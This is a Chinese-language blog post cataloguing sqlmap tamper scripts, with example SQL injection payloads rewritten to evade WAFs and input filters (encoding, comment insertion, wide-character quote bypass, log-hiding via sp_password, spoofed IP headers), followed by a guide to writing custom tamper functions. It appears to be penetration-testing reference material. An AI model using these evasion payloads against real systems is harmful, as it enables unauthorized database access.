<p>charencode.py<br>功能：采用 url 格式编码 1 次<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT FIELD FROM%20TABLE &#x3D;&#x3D;&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
<p>chardoubleencode.py<br>功能：采用 url 格式编码 2 次<br>平台：All<br>举例：SELECT FIELD FROM%20TABLE &#x3D;&#x3D;&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
<p>commalessmid.py<br>功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况<br>平台：MySQL 5.0, 5.5<br>举例：MID (VERSION (), 1, 1) &#x3D;&#x3D;&gt; MID (VERSION () FROM 1 FOR 1)</p>
<p>concat2concatws.py<br>功能：CONCAT () &#x3D;&#x3D;&gt; CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况<br>平台： MySQL 5.0<br>举例：CONCAT (1,2) &#x3D;&#x3D;&gt; CONCAT_WS (MID (CHAR (0),0,0),1,2)</p>
<p>equaltolike.py<br>功能：&#x3D; &#x3D;&#x3D;&gt; LIKE，用于过滤了等号”&#x3D;” 的情况<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5<br>举例：SELECT * FROM users WHERE id&#x3D;1 &#x3D;&#x3D;&gt; SELECT * FROM users WHERE id LIKE 1</p>
<p>greatest.py<br>功能：&gt; &#x3D;&#x3D;&gt; GREATEST<br>平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：1 AND A &gt; B &#x3D;&#x3D;&gt; 1 AND GREATEST (A, B+1)&#x3D;A<br>a 和 b+1 比较，取两者中的最大值为 a；则 a &gt;&#x3D; b+1，亦即 a &gt; b</p>
<p>halfversionedmorekeywords.py<br>功能：空格 &#x3D;&#x3D;&gt; &#x2F; !0 （在关键字前添加注释）<br>平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）<br>举例：union &#x3D;&#x3D;&gt; &#x2F;!0union</p>
<p>ifnull2ifisnull.py<br>功能：IFNULL (A, B) &#x3D;&#x3D;&gt; IF (ISNULL (A), B, A)<br>平台：MySQL 5.0 and 5.5<br>举例：IFNULL (1, 2) &#x3D;&#x3D;&gt; IF (ISNULL (1),2,1)</p>
<p>informationschemacomment.py<br>功能：<br>在 information_schema 后面加上 &#x2F;&#x2F; ，用于绕过对 information_schema 的情况<br>retVal &#x3D; re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;&#x2F; &#x2F;.”, payload)<br>平台：All<br>举例：select table_name from information_schema.tables &#x3D;&#x3D;&gt; select table_name from information_schema&#x2F;**&#x2F;.tables</p>
<p>lowercase.py<br>功能：将 payload 里的大写转为小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES &#x3D;&#x3D;&gt; select table_name from information_schema.tables</p>
<p>modsecurityversioned.py<br>功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf<br>平台：MySQL 5.0<br>举例：1 AND 2&gt;1–  &#x3D;&#x3D;&gt; 1 &#x2F;!30874AND 2&gt;1&#x2F;–</p>
<p>modsecurityzeroversioned.py<br>功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似<br>平台：Mysql<br>举例：1 and 2&gt;1–+ &#x3D;&#x3D;&gt; 1 &#x2F;!00000and 2&gt;1&#x2F;–+</p>
<p>multiplespaces.py<br>功能：围绕 SQL 关键字添加多个空格<br>平台：All<br>举例：1 UNION SELECT foobar &#x3D;&#x3D;&gt; 1   UNION   SELECT   foobar</p>
<p>nonrecursivereplacement.py<br>功能：关键字双写，可用于关键字过滤<br>平台：All<br>举例：1 UNION SELECT 2–  &#x3D;&#x3D;&gt; 1 UNIONUNION SELESELECTCT 2–</p>
<p>overlongutf8.py<br>功能： 转换给定的 payload 当中的所有字符<br>平台：All<br>举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 &#x3D;&#x3D;&gt; SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1</p>
<p>percentage.py<br>功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)<br>平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>举例：SELECT FIELD FROM TABLE &#x3D;&#x3D;&gt; % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E</p>
<p>randomcase.py<br>功能：将 payload 随机大小写<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：INSERT &#x3D;&#x3D;&gt; InseRt</p>
<p>randomcomments.py<br>功能：在 payload 的关键字中间随机插入注释符 &#x2F;**&#x2F; ，可用于绕过关键字过滤<br>平台：Mysql<br>举例：INSERT &#x3D;&#x3D;&gt; I &#x2F; ** &#x2F; N &#x2F; ** &#x2F; SERT</p>
<p>securesphere.py<br>功能：在 payload 后追加特殊构造的字符串<br>平台：All<br>举例：1 AND 1&#x3D;1 &#x3D;&#x3D;&gt; 1 AND 1&#x3D;1 and ‘0having’&#x3D;’0having’</p>
<p>space2comment.py<br>功能：用注释符 &#x2F;&#x2F; 代替空格，用于空格的绕过<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users &#x3D;&#x3D;&gt; SELECT&#x2F;&#x2F;id&#x2F;&#x2F;FROM&#x2F;&#x2F;users</p>
<p>space2dash.py<br>功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符<br>平台：MSSQL、 SQLite<br>举例：union select 1,2–+ &#x3D;&#x3D;&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
<p>space2hash.py<br>功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符<br>平台：Mysql<br>举例：union select 1,2–+ &#x3D;&#x3D;&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p>
<p>space2morehash.py<br>功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符<br>平台：MySQL &gt;&#x3D; 5.1.13<br>举例：union select 1,2–+ &#x3D;&#x3D;&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p>
<p>space2mssqlblank.py<br>功能：用随机的空白符替换 payload 中的空格<br>blanks &#x3D; (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>平台：Mssql 2000,2005<br>举例：SELECT id FROM users &#x3D;&#x3D;&gt; SELECT%0Eid%0DFROM%07users</p>
<p>space2mssqlhash.py<br>功能：用 [字符# + 一个换行符] 替换 payload 中的空格<br>平台：MSSQL、MySQL<br>举例：union select 1,2–+ &#x3D;&#x3D;&gt; union%23%0Aselect%23%0A1,2–+</p>
<p>space2plus.py<br>功能：用加号 (+) 替换空格<br>平台：All<br>举例：SELECT id FROM users &#x3D;&#x3D;&gt; SELECT+id+FROM+users</p>
<p>space2randomblank.py<br>功能：用随机的空白符替换 payload 中的空格<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：SELECT id FROM users &#x3D;&#x3D;&gt; SELECT%0Did%0DFROM%0Ausers</p>
<p>sp_password.py<br>功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space &#x3D;&#x3D;&gt; sp_password）<br>平台：Mssql<br>举例：1 AND 9227&#x3D;9227–  &#x3D;&#x3D;&gt; 1 AND 9227&#x3D;9227 – sp_password</p>
<p>symboliclogical.py<br>功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况<br>平台：All<br>举例：<br>1 and 1&#x3D;1 &#x3D;&#x3D;&gt; 1 %26%26 1&#x3D;1<br>1 or 1&#x3D;1 &#x3D;&#x3D;&gt; 1 %7c%7c 1&#x3D;1</p>
<p>unionalltounion.py<br>功能：用 union select 替换 union all select<br>平台：All<br>举例：union all select 1,2–+ &#x3D;&#x3D;&gt; union select 1,2–+</p>
<p>unmagicquotes.py<br>功能：用宽字符绕过 GPC addslashes<br>平台：All<br>举例：1’ and 1&#x3D;1 &#x3D;&#x3D;&gt; 1% df%27 and 1&#x3D;1–</p>
<p>uppercase.py<br>功能：将 payload 中的小写字母转为大写格式<br>平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>举例：insert &#x3D;&#x3D;&gt; INSERT</p>
<p>varnish.py<br>功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF<br>平台：headers &#x3D; kwargs.get (“headers”, {}) headers [“X-originating-IP”] &#x3D; “127.0.0.1”return payload<br>举例：All</p>
<p>versionedkeywords.py<br>功能：对非函数的关键字进行注释<br>平台：MySQL 4.0.18, 5.1.56, 5.5.11<br>举例：1 union select user () &#x3D;&#x3D;&gt; 1&#x2F;!UNION&#x2F;&#x2F;!SELECT&#x2F;user ()</p>
<p>versionedmorekeywords.py<br>功能：对每个关键字进行注释处理<br>平台：MySQL 5.1.56, 5.5.11<br>举例：1 union select user () &#x3D;&#x3D;&gt; 1&#x2F;!UNION&#x2F;&#x2F;!SELECT&#x2F;user ()</p>
<p>xforwardedfor.py<br>功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF<br>平台：All<br>举例：headers &#x3D; kwargs.get (“headers”, {}) headers [“X-Forwarded-For”] &#x3D; randomIP () return payload</p>
</blockquote>
<h4 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h4><p>参考：</p>
<pre><code># Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    &#39;&#39;&#39;
    Description of your tamper script
    &#39;&#39;&#39;

    retVal = payload.replace(&#39;\&#39;&#39;, &quot;%EF%BC%87&quot;) if payload else payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
</code></pre>
<p>这个 tamper 非常的简单，写的话参考这个就可以了，先来分析这里边有什么元素</p>
<ul>
<li>import部分</li>
<li><code>__priority__</code> 属性</li>
<li>dependencies函数</li>
<li>tamper函数以及用户自定义的函数</li>
</ul>
<p>import部分<br>可以导入sqlmap的内部库，sqlmap 为我们提供了很多封装好的函数和数据类型，比如上面的的PRIORITY就来源于sqlmap&#x2F;lib&#x2F;core&#x2F;enums.py</p>
<p>priority<br>定义当前 tamper 的优先级，用于有多个tamper脚本的情况，有以下参数</p>
<blockquote>
<p>class PRIORITY:    </p>
<p>LOWEST &#x3D; -100    </p>
<p>LOWER &#x3D; -50    </p>
<p>LOW &#x3D; -10    </p>
<p>NORMAL &#x3D; 0    </p>
<p>HIGH &#x3D; 10    </p>
<p>HIGHER &#x3D; 50    </p>
<p>HIGHEST &#x3D; 100</p>
</blockquote>
<h5 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h5><p>函数声明该脚本适用&#x2F;不适用的范围，可以为空，比如以下代码</p>
<pre><code># sqlmap/tamper/echarunicodeencode.py
from lib.core.common import singleTimeWarnMessage
 
def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against ASP or ASP.NET web applications&quot; % os.path.basename(__file__).split(&quot;.&quot;)[0])
 
# singleTimeWarnMessage() 于在控制台中打印出警告信息
</code></pre>
<p>数据库有以下名称，在<code>lib\core\enums.py</code>可以看到全部</p>
<blockquote>
<p>class DBMS:<br>    ACCESS &#x3D; “Microsoft Access”<br>    DB2 &#x3D; “IBM DB2”<br>    FIREBIRD &#x3D; “Firebird”<br>    MAXDB &#x3D; “SAP MaxDB”<br>    MSSQL &#x3D; “Microsoft SQL Server”<br>    MYSQL &#x3D; “MySQL”<br>    ORACLE &#x3D; “Oracle”<br>    PGSQL &#x3D; “PostgreSQL”<br>    SQLITE &#x3D; “SQLite”<br>    SYBASE &#x3D; “Sybase”<br>    HSQLDB &#x3D; “HSQLDB”<br>    ……</p>
</blockquote>
<p><code>**kwargs</code>中包含了 http 头的数据，可以从<code>kwargs</code>中取出<code>headers</code>数组在进行更改</p>
<p>比如将 http 头中的 xff 头变为随机 ip</p>
<pre><code>def tamper(payload, **kwargs):
    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)
    headers[&quot;X-Forwarded-For&quot;] = randomIP()
    return payload
</code></pre>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/06/11/encode/" title="encode"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: encode</span></a><a class="button is-default" href="/2023/06/11/environment_variable/" title="环境变量"><span class="has-text-weight-semibold">Next: 环境变量</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>